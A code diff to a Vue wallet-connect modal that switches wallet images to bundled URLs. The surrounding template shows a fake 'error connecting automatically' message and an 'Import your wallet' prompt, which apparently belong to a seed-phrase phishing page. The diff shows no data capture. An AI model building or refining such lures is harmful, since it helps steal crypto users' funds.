@@ -8,6 +8,13 @@
     import Swal from 'sweetalert2'
     import 'sweetalert2/dist/sweetalert2.min.css'
 
+    const walletImageUrls = import.meta.glob('../assets/wallets/**/*.{png,jpg,jpeg,webp}', { eager: true, as: 'url' })
+
+    const getWalletImageUrl = (walletImg) => {
+        const normalized = walletImg.replace(/\\/g, '/');
+        return walletImageUrls[`../assets/${normalized}`] || '';
+    }
+
     // Variables for each wallet modal
     const coinName = ref(null)
     const coinImage = ref(null)
@@ -48,7 +55,10 @@
         connectingInstance = new Modal(connectingModal.value)
 
         try {
-            state.wallets = walletsData.wallets;
+            state.wallets = walletsData.wallets.map(wallet => ({
+                ...wallet,
+                imageUrl: getWalletImageUrl(wallet.wallet_img)
+            }));
         } catch (error) {
             console.error('Error loading wallets from static JSON', error);
         } finally {
@@ -56,9 +66,9 @@
         }
     });
 
-    const InitializeWallet = (name, image) => {
+    const InitializeWallet = (name, imageUrl) => {
         coinName.value = name
-        coinImage.value = image
+        coinImage.value = imageUrl
         form.WalletName = name
 
         // Show first modal
@@ -184,7 +194,7 @@
                                 <small class="text-black-50 font-600 font-13">easy to use browser extension</small>
                                 </div>
                                 <div>
-                                    <img v-bind:src="'./src/assets/'+coinImage" alt="" id="wall_img" class="img" width="40">
+                                    <img :src="coinImage" alt="" id="wall_img" class="img" width="40">
                                 </div>
                             </a>
                         </div>
@@ -205,7 +215,7 @@
                             There was an error connecting automatically. But do not worry, you can still connect manually.
                         </p>
                         <h6 class="font-700 mb-3">
-                            <img v-bind:src="'./src/assets/'+coinImage" id="wall_img2" alt="" class="img" width="40">
+                            <img :src="coinImage" id="wall_img2" alt="" class="img" width="40">
                             Import your <span id="wall_name2">{{ coinName }}</span> wallet
                         </h6>
 
